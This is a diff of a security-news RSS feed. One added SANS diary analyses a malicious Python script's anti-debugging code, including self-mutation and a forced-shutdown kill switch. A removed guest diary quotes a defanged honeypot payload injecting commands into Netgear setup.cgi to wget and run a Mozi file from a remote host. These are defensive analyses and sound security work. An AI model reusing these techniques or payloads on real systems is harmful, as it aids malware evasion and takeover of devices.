@@ -1,5 +1,131 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 06 Feb 2025 08:59:20 +0000</lastBuildDate><item><title>1-15 November 2024 Cyber Attacks Timeline</title><link>https://www.hackmageddon.com/2025/02/06/1-15-november-2024-cyber-attacks-timeline/</link><description>In the first timeline of November 2024 I collected 128 events with a threat landscape dominated by malware...</description><guid isPermaLink="false">https://www.hackmageddon.com/?p=44325</guid><category>Cyber Attacks Timelines</category><category>Security</category><category>Cyber Attacks</category><category>Cyber Crime</category><category>Cyber Espionage</category><category>Cyber Warfare</category><category>Hacktivism</category><category>Malware</category><category>Ransomware</category><category>Timeline</category><category>Vulnerabilities</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Thursday, February 6th, 2025 https://isc.sans.edu/podcastdetail/9312</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>ISC Stormcast For Thursday, February 6th, 2025 https://isc.sans.edu/podcastdetail/9312, (Thu, Feb 6th)</title><link>https://isc.sans.edu/diary/rss/31656</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31656</guid></item><item><title>Passkeys: The future of secure and seamless authentication</title><link>https://www.webroot.com/blog/2025/02/05/passkeys-the-future-of-secure-and-seamless-authentication/</link><description>&lt;p&gt;What are passkeys? You may have seen the term &amp;#8220;passkeys&amp;#8221; appearing more frequently in tech news, app updates, and security discussions. Major companies like Apple, Google, and Microsoft are rolling out passkeys as a replacement for passwords, promising both enhanced security and a smoother user experience. But what exactly are passkeys, and why are they [&amp;#8230;]&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Thu, 06 Feb 2025 09:59:19 +0000</lastBuildDate><item><title>1-15 November 2024 Cyber Attacks Timeline</title><link>https://www.hackmageddon.com/2025/02/06/1-15-november-2024-cyber-attacks-timeline/</link><description>In the first timeline of November 2024 I collected 128 events with a threat landscape dominated by malware...</description><guid isPermaLink="false">https://www.hackmageddon.com/?p=44325</guid><category>Cyber Attacks Timelines</category><category>Security</category><category>Cyber Attacks</category><category>Cyber Crime</category><category>Cyber Espionage</category><category>Cyber Warfare</category><category>Hacktivism</category><category>Malware</category><category>Ransomware</category><category>Timeline</category><category>Vulnerabilities</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>The Unbreakable Multi-Layer Anti-Debugging System</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>The Unbreakable Multi-Layer Anti-Debugging System, (Thu, Feb 6th)</title><link>https://isc.sans.edu/diary/rss/31658</link><description>&lt;p&gt;The title of this diary is based on the string I found in a malicious Python script that implements many anti-debugging techniques. If some were common, others were interesting and demonstrated how low-level high-level languages like Python can access operating system information. Let&amp;#x27s review some of them&amp;#x21;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;The title of this diary is based on the string I found in a malicious Python script that implements&amp;nbsp;many anti-debugging techniques. If some were common, others were interesting and demonstrated how low-level high-level languages like Python can access operating system information. Let&amp;rsquo;s review some of them!&lt;/p&gt;
+
+&lt;p&gt;Anti-debugging techniques are like a cat-and-mouse game. If you&amp;rsquo;re interested in malware analysis, this will show you how your task can be much more challenging if you&amp;rsquo;re prepared to face them. The file was found on VT with a low score of 2/62[&lt;a href="https://www.virustotal.com/gui/file/3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612/detection"&gt;1&lt;/a&gt;]&amp;nbsp;(SHA256: 3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612). The file just contains only anti-debugging stuff and not real malware. I suspect the file to be a proof-of-concept.&lt;/p&gt;
+
+&lt;p&gt;The script is multi-threaded and launches all the techniques in parallel:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def anti_debug_check():
+    &amp;quot;&amp;quot;&amp;quot; ? The Unbreakable Multi-Layer Anti-Debugging System &amp;quot;&amp;quot;&amp;quot;
+    threads = [
+        threading.Thread(target=detect_debugger),
+        threading.Thread(target=detect_debugger_processes),
+        threading.Thread(target=detect_vm),
+        threading.Thread(target=detect_api_hooks),
+        threading.Thread(target=detect_breakpoints),
+        threading.Thread(target=detect_sandbox),
+        threading.Thread(target=detect_cpu_usage),
+        threading.Thread(target=detect_memory_tampering),
+        threading.Thread(target=detect_mouse_movements),
+        threading.Thread(target=detect_execution_speed),
+        threading.Thread(target=detect_registry_keys),
+        threading.Thread(target=detect_screenshot),
+        threading.Thread(target=infinite_loop_debugger_trap),
+        threading.Thread(target=inject_fake_code),
+        threading.Thread(target=polymorphic_self_mutation)
+    ]
+    for t in threads:
+        t.daemon = True
+        t.start()
+    for t in threads:
+        t.join()&lt;/pre&gt;
+
+&lt;p&gt;Let&amp;rsquo;s focus on the interesting ones. &amp;laquo;&amp;nbsp;polymorphic_self_mutation&amp;nbsp;&amp;raquo; will change the Python script file. In a Python program, the variable &amp;quot;__file__&amp;quot; contains the path of the currently executed script. This variable is used to read the content of the script, randomize the lines, and overwrite it:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def polymorphic_self_mutation():
+    &amp;quot;&amp;quot;&amp;quot; ? Self-Mutating Code to Avoid Static Analysis &amp;quot;&amp;quot;&amp;quot;
+    with open(__file__, &amp;quot;r&amp;quot;, encoding=&amp;quot;utf-8&amp;quot;) as f:
+        lines = f.readlines()
+    with open(__file__, &amp;quot;w&amp;quot;, encoding=&amp;quot;utf-8&amp;quot;) as f:
+        random.shuffle(lines)
+        f.writelines(lines)&lt;/pre&gt;
+
+&lt;p&gt;The new file will have, for example, a different hash and will be more difficult to hunt.&lt;/p&gt;
+
+&lt;p&gt;The next technique is a typical Python trick provided by sys.gettrace[&lt;a href="https://docs.python.org/3/library/sys.html#sys.gettrace"&gt;2&lt;/a&gt;].&amp;nbsp;If a debugger is attached to the Python process, this function will return a trace function. The purpose of this technique is to loop forever if a debugger is attached to the Python script.&amp;nbsp;&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def infinite_loop_debugger_trap():
+    &amp;quot;&amp;quot;&amp;quot; ? If Debugger is Attached, Trap it in an Infinite Loop &amp;quot;&amp;quot;&amp;quot;
+    while sys.gettrace():
+        pass  # Debugger is stuck here forever&lt;/pre&gt;
+
+&lt;p&gt;I like the &amp;laquo;&amp;nbsp;memory tampering&amp;nbsp;&amp;raquo; technique: The script computes its hash and recheck it at regular intervals:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def detect_memory_tampering():
+    original_hash = hashlib.md5(open(sys.argv[0], &amp;quot;rb&amp;quot;).read()).hexdigest()
+    while True:
+        time.sleep(2)
+        current_hash = hashlib.md5(open(sys.argv[0], &amp;quot;rb&amp;quot;).read()).hexdigest()
+        if current_hash != original_hash:
+            kill_system()&lt;/pre&gt;
+
+&lt;p&gt;The next one relies on the API call IsDebuggerPresent(). This one is often hooked to prevent the simple detection of a debugger.&amp;nbsp;The value 0xE9 is the op-code for a long jump&amp;hellip; This hooking technique is called &amp;laquo;&amp;nbsp;trampoline&amp;nbsp;&amp;raquo;. If the very first byte of the API call loaded in memory is 0xE9, it has been hooked!&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def detect_api_hooks():
+    kernel32 = ctypes.windll.kernel32
+    original_bytes = ctypes.create_string_buffer(5)
+    kernel32.ReadProcessMemory(kernel32.GetCurrentProcess(), kernel32.IsDebuggerPresent, original_bytes, 5, None)
+    if original_bytes.raw[0] == 0xE9:  # Hook detected
+        kill_system()&lt;/pre&gt;
+
+&lt;p&gt;When you debug, you probably use breakpoints, right? The following code helps to detect hardware breakpoints:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def detect_breakpoints():
+    context = ctypes.create_string_buffer(0x4C)
+    context_ptr = ctypes.byref(context)
+    context_offset = struct.calcsize(&amp;quot;Q&amp;quot;) * 6
+    ctypes.windll.kernel32.RtlCaptureContext(context_ptr)
+    dr0, dr1, dr2, dr3 = struct.unpack_from(&amp;quot;4Q&amp;quot;, context.raw, context_offset)
+    if dr0 or dr1 or dr2 or dr3:
+        kill_system()&lt;/pre&gt;
+
+&lt;p&gt;Hardware breakpoints are used to avoid patching the program. They contain the address where to pause the execution. Hardware breakpoints are CPU registers: DRO to&amp;nbsp;DR3 (on Intel CPU&amp;rsquo;s). RtlCaptureContext()[&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext"&gt;3&lt;/a&gt;] is used to get the current threat&amp;rsquo;s execution state which includes the registers. With the help of unpack, the script fills the variable corresponding to the registers, if one of them is not empty, there is a hardware breakpoint defined!&lt;/p&gt;
+
+&lt;p&gt;Other checks are really common: detection of suspicious process names, and specific registry keys, &amp;hellip; I'll not cover them.&lt;/p&gt;
+
+&lt;p&gt;You can see that all functions will call kill_system() if tests are successful. This function will just annoy the malware analysts by crashing (or trying to crash) the system:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+def kill_system():
+    &amp;quot;&amp;quot;&amp;quot; ? THE ULTIMATE KILL-SWITCH ? &amp;quot;&amp;quot;&amp;quot;
+    try:
+        ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+    except:
+        os.system(&amp;quot;shutdown /s /t 0&amp;quot;)  # Force shutdown&lt;/pre&gt;
+
+&lt;p&gt;The purpose of the function is&amp;nbsp;easy to understand but when NtRaiseHardError[&lt;a href="https://github.com/AgnivaMaity/NtRaiseHardError-Example"&gt;4&lt;/a&gt;] is invoked, it does not automatically cause a kernel panic or system-wide crash. Instead, the system can handle the error in various ways, including logging the event, presenting an error dialog, or terminating the application that called the function. I tried in a VM:&lt;/p&gt;
+
+&lt;pre style="background: rgb(238, 238, 238); border: 1px solid rgb(204, 204, 204); padding: 5px 10px;"&gt;
+C:\Users\REM&amp;gt;python
+Python 3.5.2 (v3.5.2:4def2a2901a5, Jun 25 2016, 22:18:55) [MSC v.1900 64 bit (AMD64)] on win32
+Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; import ctypes
+&amp;gt;&amp;gt;&amp;gt; ctypes.windll.ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
+-1073741727
+&amp;gt;&amp;gt;&amp;gt;&lt;/pre&gt;
+
+&lt;p&gt;When you convert the value -1073741727 to hexadecimal, you get 0xC000001F, which is a Windows NTSTATUS code. Specifically, this error code indicates a STATUS_INVALID_PARAMETER error...&lt;/p&gt;
+
+&lt;p&gt;The Python script is a great example of multiple techniques that can be implemented in malware!&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href="https://www.virustotal.com/gui/file/3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612/detection"&gt;https://www.virustotal.com/gui/file/3a216b238bae042312ab810c0d07fdc49e8eddc97a2dec3958fb6b1f4ecd4612/detection&lt;/a&gt;&lt;br /&gt;
+[2]&amp;nbsp;&lt;a href="https://docs.python.org/3/library/sys.html#sys.gettrace"&gt;https://docs.python.org/3/library/sys.html#sys.gettrace&lt;/a&gt;&lt;br /&gt;
+[3]&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext"&gt;https://learn.microsoft.com/en-us/windows/win32/api/winnt/nf-winnt-rtlcapturecontext&lt;/a&gt;&lt;br /&gt;
+[4]&amp;nbsp;&lt;a href="https://github.com/AgnivaMaity/NtRaiseHardError-Example"&gt;https://github.com/AgnivaMaity/NtRaiseHardError-Example&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Xavier Mertens (@xme)&lt;br /&gt;
+Xameco&lt;br /&gt;
+Senior ISC Handler - Freelance Cyber Security Consultant&lt;br /&gt;
+&lt;a href="https://keybase.io/xme/key.asc"&gt;PGP Key&lt;/a&gt;&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31658</guid></item><item><title>ISC Stormcast For Thursday, February 6th, 2025 https://isc.sans.edu/podcastdetail/9312, (Thu, Feb 6th)</title><link>https://isc.sans.edu/diary/rss/31656</link><description>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</description><content:encoded>(c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31656</guid></item><item><title>Passkeys: The future of secure and seamless authentication</title><link>https://www.webroot.com/blog/2025/02/05/passkeys-the-future-of-secure-and-seamless-authentication/</link><description>&lt;p&gt;What are passkeys? You may have seen the term &amp;#8220;passkeys&amp;#8221; appearing more frequently in tech news, app updates, and security discussions. Major companies like Apple, Google, and Microsoft are rolling out passkeys as a replacement for passwords, promising both enhanced security and a smoother user experience. But what exactly are passkeys, and why are they [&amp;#8230;]&lt;/p&gt;
 &lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/02/05/passkeys-the-future-of-secure-and-seamless-authentication/" rel="nofollow"&gt;Passkeys: The future of secure and seamless authentication&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;h2 class="wp-block-heading"&gt;What are passkeys?&lt;/h2&gt;
 
 
@@ -2072,138 +2198,7 @@ Richard Porter&lt;br /&gt;
 &lt;p&gt;In January 2024, the &lt;strong&gt;U.S. Department of Commerce&lt;/strong&gt; issued &lt;a href="https://www.federalregister.gov/documents/2024/01/29/2024-01580/taking-additional-steps-to-address-the-national-emergency-with-respect-to-significant-malicious" rel="noopener" target="_blank"&gt;a proposed rule&lt;/a&gt; that would require cloud providers to create a &amp;#8220;Customer Identification Program&amp;#8221; that includes procedures to collect data sufficient to determine whether each potential customer is a foreign or U.S. person.&lt;/p&gt;
 &lt;p&gt;According to the law firm &lt;strong&gt;Crowell &amp;amp; Moring LLP&lt;/strong&gt;, the Commerce rule also would require &amp;#8220;infrastructure as a service&amp;#8221; (IaaS) providers to report knowledge of any transactions with foreign persons that might allow the foreign entity to train a large AI model with potential capabilities that could be used in malicious cyber-enabled activity.&lt;/p&gt;
 &lt;p&gt;&amp;#8220;The proposed rulemaking has garnered global attention, as its cross-border data collection requirements are unprecedented in the cloud computing space,&amp;#8221; Crowell &lt;a href="https://www.crowell.com/en/insights/client-alerts/who-iaas-your-foreign-customer-department-of-commerce-proposes-foreign-customer-identification-requirements-for-us-iaas-providers" rel="noopener" target="_blank"&gt;wrote&lt;/a&gt;. &amp;#8220;To the extent the U.S. alone imposes these requirements, there is concern that U.S. IaaS providers could face a competitive disadvantage, as U.S. allies have not yet announced similar foreign customer identification requirements.&amp;#8221;&lt;/p&gt;
-&lt;p&gt;It remains unclear if the new White House administration will push forward with the requirements. The Commerce action was mandated as part of an executive order President Trump issued a day before leaving office in January 2021.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://krebsonsecurity.com/?p=70065</guid><category>A Little Sunshine</category><category>Ne'er-Do-Well News</category><category>Time to Patch</category><category>Web Fraud 2.0</category><category>ACB Group</category><category>Amazon AWS</category><category>Anjie CDN</category><category>Crowell &amp; Moring LLP</category><category>Fangneng CDN</category><category>Funnull</category><category>infrastructure laundering</category><category>Microsoft Azure</category><category>NETSCOUT</category><category>NoName057(16)</category><category>polyfill</category><category>Richard Hummel</category><category>Silent Push</category><category>Suncity Group</category><category>U.S. Department of Commerce</category><category>Zach Edwards</category></item><item><title>PCAPs or It Didn't Happen: Exposing an Old Netgear Vulnerability Still Active in 2025 &amp;#x5b;Guest Diary&amp;#x5d;, (Thu, Jan 30th)</title><link>https://isc.sans.edu/diary/rss/31638</link><description>&lt;p&gt;&amp;#x5b;This is a Guest Diary by David Watson, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program&amp;#x5d;&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;[This is a Guest Diary by David Watson, an ISC intern as part of the SANS.edu &lt;a href="https://www.sans.edu/cyber-security-programs/bachelors-degree/"&gt;BACS&lt;/a&gt; program]&lt;/p&gt;
-
-&lt;p&gt;One thing I&amp;rsquo;ve learned about cybersecurity, particularly during my time here at the Internet Storm Center is this: If you don&amp;rsquo;t capture detailed network data (like PCAPs), you can easily miss the full picture of an attack, even with the most aggressive logging practices.&lt;br /&gt;
-&amp;nbsp;&lt;br /&gt;
-One of the attack observations I submitted on January 12th detailed an older vulnerability that uses HTTP GET requests, attempting to perform unauthenticated OS command injections on some legacy Netgear devices, targeting the &amp;lsquo;setup.cgi&amp;rsquo; script. I was curious as to which Netgear devices might be involved, and some research led me to a few publications on exploit-db.com, which identified specifically the DGN1000 with firmware versions before 1.1.0.48, and the DGN2200v1 (all firmware versions) modem/router models.[&lt;a href="https://www.exploit-db.com/exploits/25978"&gt;2&lt;/a&gt;][&lt;a href="https://www.exploit-db.com/exploits/43055"&gt;3&lt;/a&gt;] Both of these models are shown to be &amp;ldquo;end of service&amp;rdquo; on the Netgear website. [&lt;a href="https://www.netgear.com/support/product/dgn2200v1/"&gt;4&lt;/a&gt;][&lt;a href="https://www.netgear.com/support/product/dgn1000/"&gt;5&lt;/a&gt;] There was no CVE mentioned, but a few days later I found out from another post on the 15th of January here at the Internet Storm Center, written by Dr. Yee Ching Tok, Ph.D., ISC Handler:&lt;/p&gt;
-
-&lt;p&gt;&amp;ldquo;This vulnerability was only formally registered in the CVE database in 2024 although it was first disclosed in May 2013, and the corresponding CVE entry was published recently on January 10, 2025.&amp;rdquo; [&lt;a href="https://isc.sans.edu/diary/The+Curious+Case+of+a+12YearOld+Netgear+Router+Vulnerability/31592"&gt;6&lt;/a&gt;]&lt;/p&gt;
-
-&lt;p&gt;CVE-2024-12847 has a CVSS score of 9.8 as shown on NIST.gov. [&lt;a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12847"&gt;7&lt;/a&gt;] This post will illustrate how I found this in my logs, why it matters, and how packet captures and Zeek logs proved essential.&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;An Older Vulnerability Resurfaces&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Netgear&amp;rsquo;s DGN1000 and DGN2200v1 devices are end-of-life (EOL) devices. The bug sits in a script called &amp;lsquo;setup.cgi&amp;rsquo;, (cgi = Common Gateway Interface) which is meant for administrative management of the router. Attackers discovered that by passing certain parameters, one can execute arbitrary OS commands on the router&amp;rsquo;s underlying Linux operating system as root, without any authentication checks. Over the last several months my web logs showed 257 suspicious HTTP GET requests from 16 unique IP addresses to &amp;lsquo;/setup.cgi&amp;rsquo;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic1.png" style="width: 600px; height: 309px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic2.png" style="width: 600px; height: 270px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Looking into my Zeek logs to correlate this activity revealed an interesting payload, showing two examples of the command injection attempts here:&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic3.png" style="width: 600px; height: 104px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Breaking this down, we have:&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;GET /setup.cgi?next_file=netgear.cfg &amp;ndash; Targeting the setup.cgi script.&lt;/li&gt;
-	&lt;li&gt;&amp;amp;todo=syscmd &amp;ndash; Calling the syscmd function.&lt;/li&gt;
-	&lt;li&gt;&amp;amp;cmd=rm+-rf+/tmp/*;wget+hxxp[://]&amp;lt;ip_address:port&amp;gt;/Mozi[.]m+-O+/tmp/netgear;sh+netgear &amp;ndash; OS command injection.&lt;/li&gt;
-	&lt;li&gt;&amp;amp;curpath=/ - Setting &amp;ldquo;current path&amp;rdquo; to root.&lt;/li&gt;
-	&lt;li&gt;&amp;amp;currentsetting.htm=1 &amp;ndash; unclear exactly what this part does.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;The command injection attempt aims to:&lt;/p&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;rm -rf /tmp/*; - Remove the contents of the /tmp directory.&lt;/li&gt;
-	&lt;li&gt;wget hxxp[://]&amp;lt;ip_address:port&amp;gt;/Mozi[.]m -O /tmp/netgear; - Retrieve malicious script (Mozi botnet related? [&lt;a href="https://thehackernews.com/2024/11/androxgh0st-malware-integrates-mozi.html"&gt;14&lt;/a&gt;]) from remote server, save it in /tmp directory and name it &amp;ldquo;netgear&amp;rdquo;.&lt;/li&gt;
-	&lt;li&gt;sh netgear &amp;ndash; Execute malicious script on target device.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Reverse-Engineering setup.cgi&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Curiosity drove me to download a vulnerable version of the DGN1000 firmware, specifically version 1.1.00.24, still available right off the Netgear website! [&lt;a href="https://kb.netgear.com/2649/NETGEAR-Open-Source-Code-for-Programmers-GPL"&gt;8&lt;/a&gt;] I found the setup.cgi file, located in the &amp;lt;source&amp;gt;/target/sbin directory. Running the &amp;lsquo;file&amp;rsquo; command showed:&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;setup.cgi: ELF 32-bit MSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;Using my relatively new reverse engineering &amp;ldquo;ninja&amp;rdquo; skills gained from several CTFs I have participated in over the last few years (and various websites with C documentation), I decided to attempt a disassembly with radare2, [&lt;a href="https://github.com/radareorg/radare2"&gt;10&lt;/a&gt;] as it allows me to look inside this compiled binary and see how it works.&lt;/p&gt;
-
-&lt;p&gt;I am interested in the syscmd function, so I ran &amp;ldquo;iz~syscmd&amp;rdquo;, which gave me a string reference to syscmd and and a pointer to its location. Running &amp;ldquo;pdf&amp;rdquo; (print disassembly of function) after navigating to that address within the binary reveals the function associated with syscmd. Here is what that looks like:&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic4.png" style="width: 600px; height: 530px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic5.png" style="width: 600px; height: 513px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Right off the bat, I can see some standard C library calls like putenv, printf, snprintf, chdir, puts, fflush, popen, fread, fwrite, and pclose. [&lt;a href="https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name"&gt;9&lt;/a&gt;] &amp;ldquo;find_val&amp;rdquo; might be a custom or proprietary function specific to the Netgear firmware, but I did not find any specific reference pointing to this as of now. Given the context of this disassembly, we will assume that find_val has something to do with retrieving user-supplied parameters. Based on the sequence of events here, this is what I can conclude from the syscmd function:&lt;/p&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;putenv, puts, and printf have to do with setting up the environment, status messages and/or error reporting and/or debugging.[&lt;a href="https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name"&gt;9&lt;/a&gt;]&lt;/li&gt;
-	&lt;li&gt;find_val most likely retrieves user-supplied parameters.&lt;/li&gt;
-	&lt;li&gt;snprintf formats and stores characters into the buffer [9], likely from find_val.&lt;/li&gt;
-	&lt;li&gt;chdir possibly relates to the curpath=/ in the HTTP request.&lt;/li&gt;
-	&lt;li&gt;fflush writes the contents of the buffer to the output stream. [&lt;a href="https://www.ibm.com/docs/en/i/7.5?topic=extensions-standard-c-library-functions-table-by-name"&gt;9&lt;/a&gt;]&lt;/li&gt;
-	&lt;li&gt;popen spawns a shell instance and executes the command. [&lt;a href="https://c-for-dummies.com/blog/?p=1418"&gt;11&lt;/a&gt;]&lt;/li&gt;
-	&lt;li&gt;fread() and fwrite() capture the output and send it somewhere (log file and/or back to the user if necessary)[9]&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Based on what we can see how the syscmd function is laid out, there is absolutely zero input sanitization, and, looking at the entire setup.cgi script there is no mention of any authentication checks before being able to run these commands.&lt;/p&gt;
-
-&lt;p&gt;As far as the netgear.cfg file goes, it is not entirely clear why there is a &amp;ldquo;next_file = netgear.cfg&amp;rdquo; parameter before the &amp;ldquo;&amp;amp;todo=syscmd&amp;hellip;etc&amp;rdquo; begins. I did not have access to the netgear.cfg file as it was a broken hard link pointing to the /tmp directory which was empty. I did find the &amp;ldquo;currentsetting.htm&amp;rdquo; file in source/target/www.eng, which, when printed, shows basic information about the device:&lt;/p&gt;
-
-&lt;ul&gt;
-	&lt;li&gt;Firmware=V1.1.0.24NA&lt;/li&gt;
-	&lt;li&gt;RegionTag=DGN1000_NA&lt;/li&gt;
-	&lt;li&gt;Region=US&lt;/li&gt;
-	&lt;li&gt;Model=DGN1000&lt;/li&gt;
-	&lt;li&gt;InternetConnectionStatus=Up&lt;/li&gt;
-	&lt;li&gt;ParentalControlSupported=1&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;I also found something else interesting here. A file called syscmd.htm which has several interesting JavaScript functions in it relating to our exploit.&lt;/p&gt;
-
-&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic6.png" style="width: 600px; height: 462px;" /&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/David_Watson_pic7.png" style="width: 600px; height: 190px;" /&gt;&lt;/p&gt;
-
-&lt;p&gt;Essentially this (combined with the rest of the script, not included here) looks like part of the local front-end of the router&amp;rsquo;s web page to facilitate running the user-initiated commands.&lt;/p&gt;
-
-&lt;p&gt;This is interesting because there is at least some of the input validation/sanitization (included in some of the REGEX) we were looking for in the setup.cgi script itself! But this is only really enforced on the client/local side. There is nothing stopping an attacker from using this script to craft their own custom HTTP requests and sending them directly to the setup.cgi script in the provided format:&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;url: &amp;ldquo;/setup.cgi?todo=syscmd&amp;amp;cmd=&amp;lt;command_injection&amp;gt;&amp;amp;curpath=/&amp;rdquo;&lt;/span&gt;&lt;/p&gt;
-
-&lt;p&gt;The only remaining parts to the full URL we mentioned are the &amp;ldquo;next_file=netgear.cfg&amp;rdquo; and &amp;ldquo;currentsetting.htm=1&amp;rdquo;. It is possible that these parameters need to be added to prevent the failure of the request/destination device throwing back errors, or perhaps one or both values have to do with the authentication bypass, as we did not see any checks for authentication in the setup.cgi script itself. It is also possible that the attackers are just re-using the proof of concept that was referenced on the exploit-db site,[2][3] showing the exact format of the exploit, and not personally crafting the request themselves, save for the remote server IP and the malicious files in question, used to add the router to a botnet and/or hijack CPU resources to mine cryptocurrency, as we have also seen in other attempts on my honeypot.&lt;/p&gt;
-
-&lt;p&gt;&lt;span style="font-size: 16px;"&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
-
